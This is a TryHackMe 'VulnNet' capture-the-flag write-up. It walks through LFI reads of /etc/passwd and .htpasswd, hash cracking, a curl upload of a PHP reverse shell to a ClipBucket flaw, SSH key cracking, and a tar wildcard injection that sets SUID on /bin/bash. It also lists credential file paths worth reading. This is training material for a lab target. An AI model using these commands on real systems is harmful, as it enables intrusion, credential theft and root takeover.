# VulnNet TryHackMe WriteUp
## Machine's IP = 10.114.177.13

----
At first, I will use **rustscan** to define open ports:
```bash
rustscan -a 10.114.177.13 -r 1-65000
```
We have two open ports like [22, 80]. When I look at the web-site, I saw a login page. I tried default login credentials like (admin:admin, admin:password) but none of them worked. The register and password change buttons aren't work also. When I review the source code of login page, I saw that these buttons really doesn't forwar us to anywhere.    

I returned the home page again and checked the source code. Oww, I identified two JavaScript files with unique hash-based naming conventions: ***/js/index__7ed54732.js*** and ***/js/index__d8338055.js***.

Reasoning:
 --> Dynamic Naming & Logic: The use of hashes suggests these are "production builds" that likely contain the *core application logic and client-side routing*.  
 --> Information Leakage: Such files are high-value targets for Information Disclosure, as developers often inadvertently leave hardcoded *API endpoints, hidden directory paths, or testing credentials* (sensitive headers/comments) within the bundled code.  
 Kept them in my mind. Let's use FFUF to make a directory scan. But don't forget to add this IP as the domain name ***"vulnnet.thm"*** in /etc/hosts file (I learned this domain after detailed nmap scan for the defined ports 22 and 80):
```bash
ffuf -u http://vulnnet.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0
```
|  
<img width="1263" height="339" alt="Screenshot From 2026-02-21 22-25-25" src="https://github.com/user-attachments/assets/e34a0c9a-4f8c-490c-811e-72b8adef4ffc" />  
|  
Unfortunately, I didn't get very important directory from there. But I saw "js" folder. Remember that there were two URLs in the source code. Let's check them.  
|  
<img width="3199" height="593" alt="Screenshot From 2026-02-21 22-28-22" src="https://github.com/user-attachments/assets/70042936-2249-4329-9f51-b1081bf425d7" />  
|  
<img width="3199" height="441" alt="Screenshot From 2026-02-21 22-29-20" src="https://github.com/user-attachments/assets/f03c2e3e-fd41-4b1a-b39c-ae37047b3d75" />  
|  
They are raw javascript files and I don't understand anything from there. That is why I will use **https://deobfuscate.io/** to read this files in a good format. I found two important hint from there:  
|    
<img width="908" height="278" alt="Screenshot From 2026-02-21 22-38-01" src="https://github.com/user-attachments/assets/3043f173-fc21-4e10-a274-d266cf2e3215" />  
|   
It was from the first js code. It means there is a subdomain like: **broadcast.vulnnet.com**.  
|  
<img width="908" height="99" alt="Screenshot From 2026-02-21 22-44-01" src="https://github.com/user-attachments/assets/497883f4-d923-47f4-9c2b-9fecf4fdbe32" />  
|  
Ant lastly, there is a parameter which is called: **"referer"**. I will try **LFI** with it. Lets make a subdomain scan with FFUF to be sure if there are another subdomains.  
```bash
ffuf -H "Host: FUZZ.vulnnet.thm" -u http://vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 5829
```
No, we have ony one subdomain -> **broadcast**. Let's visit this website and see what waits for us in there. But don't forget to add it into /etc/hosts file.   

----

In FFUF scan we saw that this subdomain gives 401 error. Which means that we need to be authenticated to access it. {broadcast [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 75ms]}. We don't have credentials. So, I decided to check LFI on found parameter:  
|   
<img width="2646" height="876" alt="Screenshot From 2026-02-21 22-49-35" src="https://github.com/user-attachments/assets/c2258a15-15a6-45c5-8f7e-c822a11e21d4" />  
|   
I can see that there is three users = [www-data, root, server-management]. Lets do a FFUF scan again to know what we can see with this parameter:  
```bash
ffuf -u http://vulnnet.thm?referer=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 5829
```
It gave us some paths to check but I recommend these paths in some situations like that. Because we can get so much important information from there quickly:  
```bash
/etc/apache2/apache2.conf  -> main Apache config file
/etc/apache2/sites-enabled/000-default.conf  -> main domain specific config file
/etc/apache2/sites-enabled/[SUBDOMAIN].conf  -> subdomain specific config file
/etc/apache2/envvars  -> environment variables used by Apache
/etc/apache2/.htpasswd  -> stores Apache credentials
/etc/apache2/.htaccess  -> defines Apache server access control
/etc/php/[VERSION]/apache2/php.ini  -> PHP config file
/etc/httpd/conf/httpd.conf  -> additional web server config file
/var/log/apache2/access.log  -> Apache logs
/var/log/apache2/error.log  -> Apache logs

/etc/passwd  -> list of active users
/etc/hosts  -> local DNS file, may expose new subdomains
/etc/crontab  -> active cronjobs
/proc/self/environ  -> environment variables used by current process (web server)
/proc/version  -> Linux kernel info
```
When I checked **"/etc/apache2/.htpasswd"** this, I got a username and a hash password of it.  
***-> developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0 <-***  
Lets crack this hash and maybe after this we can authenticate ourselves for the broadcast subdomain.  
|  
<img width="1266" height="521" alt="Screenshot From 2026-02-21 23-01-53" src="https://github.com/user-attachments/assets/534628c8-7955-472e-bc32-1e6ffcfd89df" />  
|  
Yeahh, I got it. Lets access the web-site. I tried to login with found credentials, to create my own account but none of them worked. So, I decided that I can already do a FFUF directory scan for this subdomain. But before, I need to take **Authorization** part of the request on the website by the help of BurpSuite. Otherwise, I cannot do directory scan because I must authenticate myself on this subdomain.  
|  
<img width="1101" height="639" alt="Screenshot From 2026-02-21 23-07-40" src="https://github.com/user-attachments/assets/ece64604-d2f5-4e03-aef5-b9ab82ad5e7c" />  
|  
I got it. Let's do this scan:  
```bash
ffuf -u http://broadcast.vulnnet.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H "Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw==" -fs 468 -e .php,.txt,.bak,.zip
```
|    
<img width="1283" height="1626" alt="Screenshot From 2026-02-21 23-11-27" src="https://github.com/user-attachments/assets/f40177a2-7c42-45fd-8a74-1db3eafecfad" />  
|  
Yeah, I got so much results from there. I tried the important ones but couldn't find anything essential. So I decided to look at the source code and yeahhh, I found the *version of clipbucket*:  
|  
<img width="483" height="83" alt="Screenshot From 2026-02-21 23-13-31" src="https://github.com/user-attachments/assets/973b1ecf-dbd7-4321-b80e-12cb8df67862" />  
|  
I immediately check it on searchsploit and found a vulnerability.  
|  
<img width="3196" height="939" alt="Screenshot From 2026-02-21 23-14-36" src="https://github.com/user-attachments/assets/799f2fd1-6ddd-42a0-9714-f3ab84e9e125" />  
|  
Look at the last one. We can use it. Lets install this text file to see waht we should do to exploit the clipbucket.  
```bash  
searchsploit -m php/webapps/44250.txt
```
 ----

I saw some commands in there to get reverseshell. For example I want to use [curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php" "http://$HOST/actions/beats_uploader.php"].Let's personalize it based on the data we have about the web-site.  
```bash
curl -u developers:9972761drmfsls -F "file=@reverseshell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```
""""" It will give a result like: creating" file{"success":"yes","file_name":"1771701846c71fd0","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR}. If you didn't get any result like this and instead get the html code as a result, I recommend you to terminate the machine, change the /etc/hosts file and access this subdomain. Don't try to login on the website, otherwise it will not work. I don't know why there is a problem like this actually but it worked on me."""""  
Let's access this folder, and click on the created file, get a shell by the nc connection:   
|  
<img width="1476" height="426" alt="Screenshot From 2026-02-21 23-28-47" src="https://github.com/user-attachments/assets/8c63699f-62a6-482b-b4c4-18f55db1acce" />
|  
Just click on it and get a shell.  

----
# USER FLAG

I saw that I cannot read the user files and I am "www-data" user. I looked at SUID binries by this command "find / -perm /4000 2>/dev/null" but got nothing useful. When I checked "cat /etc/crontab" I saw a file in there.    
|  
<img width="1396" height="243" alt="Screenshot From 2026-02-21 23-32-35" src="https://github.com/user-attachments/assets/850acac5-a2b3-4a4a-966f-14e96af69a84" />
|  
I wanted to read this script and see what was inside it: /var/opt/backupsrv.sh  
```bash
www-data@vulnnet:/home$ cat /var/opt/backupsrv.sh
cat /var/opt/backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
www-data@vulnnet:/home$
```

dest="/var/backups" this line was very intersting for me so, lets check it.  
|  
<img width="1271" height="949" alt="Screenshot From 2026-02-21 23-34-34" src="https://github.com/user-attachments/assets/9aea92a5-7cf4-42e4-8431-341e990b2b3b" />  
|  
It looks fantasticcc. I think that we can find so much essential things from this file. I need to open a python connection on target machine and take the file from there by wget.  
```bash
# On target machine
python3 -m http.server 8080
```
|  
```bash
# On my terminal
wget http://broadcast.vulnnet.thm:8080/ssh-backup.tar.gz
gzip -d ssh-backup.tar.gz
tar xvf ssh-backup.tar
```
It gave me an id_rsa file but it is encrypted. So, let's decrypt it.  
```bash
ssh2john id_rsa > rsa
john --wordlist=/usr/share/wordlists/rockyou.txt rsa
john --show rsa
# id_rsa:oneTWO3gOyac
```
I got the password, I know the name of user. The first thing i should try is ssh connection. Oww, It wasn't the password of the user. It was the passphase of the is_rsa. Lets try this command:  
```bash
ssh -i id_rsa server-management@broadcast.vulnnet.thm
# After adding the passphase, we will successfully access server-management user
```
I got the USER FLAG from there.  

----

# Privilege Escalation
Firstly, I noticed that there is .mozilla folder on the server-management user. It is very useful normally because it stores all saved data, credentials of the users on the browser. I used firefox_decryption.py script to see credentials but it was a huge rabbit hole which took my time. But if you want to know how to do that process, you can check my first VulnNet:EndGame CTF on my repository.    
Do you remeber **"/var/opt/backupsrv.sh"** file that we found? Go to read it again. There was a line like:  
```bash
# Backup the files using tar.  
tar czf $dest/$archive_file $backup_files
```
Why this script is a "Gift" for a hacker:    

The script **/var/opt/backupsrv.sh** is dangerous because of three simple things:  

    It runs as Root: This means whatever the script does, it has total power over the computer.

    It goes to a folder you own: It uses cd /home/server-management/Documents. You have the keys to this folder.

    It uses a Star (*): When the script says tar ... *, it tells the computer: "Take every single name in this folder and put it into the command."

The "Wildcard Trick" (Step-by-Step)

Imagine you have a folder with a file named report.pdf. When the script runs, the command becomes:
tar czf backup.tgz report.pdf

But, in Linux, if you name a file starting with dashes (like --help), the computer thinks it is a setting (a flag), not a file name.
Step 1: Create a "Key" (The Payload)

You want the root user to give you power. You create a file called exploit.sh. Inside this file, you write a command to change the permissions of the system's "engine" (/bin/bash).

    Command: echo "chmod +s /bin/bash" > exploit.sh

    What it does: This "s" bit (SUID) allows a normal user to run Bash with Root powers.

Step 2: Create the "Triggers"

You create two empty files with very strange names. These names are actually commands for the tar program.

    File 1: --checkpoint=1

        This tells tar: "After you archive 1 file, stop and check for an action."

    File 2: --checkpoint-action=exec=sh exploit.sh

        This tells tar: "The action I want you to do is run my exploit.sh script."

The Explosion (What happens next)

When the Root user's script runs the next time, it enters your Documents folder and runs the tar command with the star (*). Because of your files, the command actually looks like this to the computer:

tar czf backup.tgz report.pdf --checkpoint=1 --checkpoint-action=exec=sh exploit.sh exploit.sh

Because tar is running as Root, it follows those instructions perfectly. It reaches the "checkpoint" and executes sh exploit.sh with Root power.
```bash
server-management@vulnnet:~$ cd /home/server-management/Documents
server-management@vulnnet:~/Documents$ echo "chmod +s /bin/bash" > exploit.sh
server-management@vulnnet:~/Documents$ echo "" > '--checkpoint=1'
server-management@vulnnet:~/Documents$ echo "" > '--checkpoint-action=exec=sh exploit.sh'
server-management@vulnnet:~/Documents$ ls -la
total 92
drwxr-xr-x  2 server-management server-management  4096 Feb 21 21:00  .
drwxrw---- 18 server-management server-management  4096 Jan 24  2021  ..
-rw-rw-r--  1 server-management server-management     1 Feb 21 20:59 '--checkpoint=1'
-rw-rw-r--  1 server-management server-management     1 Feb 21 21:00 '--checkpoint-action=exec=sh exploit.sh'
-rw-r-----  1 server-management server-management 35144 Jan 23  2021 'Daily Job Progress Report Format.pdf'
-rw-r-----  1 server-management server-management 33612 Jan 23  2021 'Employee Search Progress Report.pdf'
-rw-rw-r--  1 server-management server-management    19 Feb 21 20:58  exploit.sh
server-management@vulnnet:~/Documents$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
server-management@vulnnet:~/Documents$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4#
```
Bingoo, I am root right now. And got the root flag from there.



















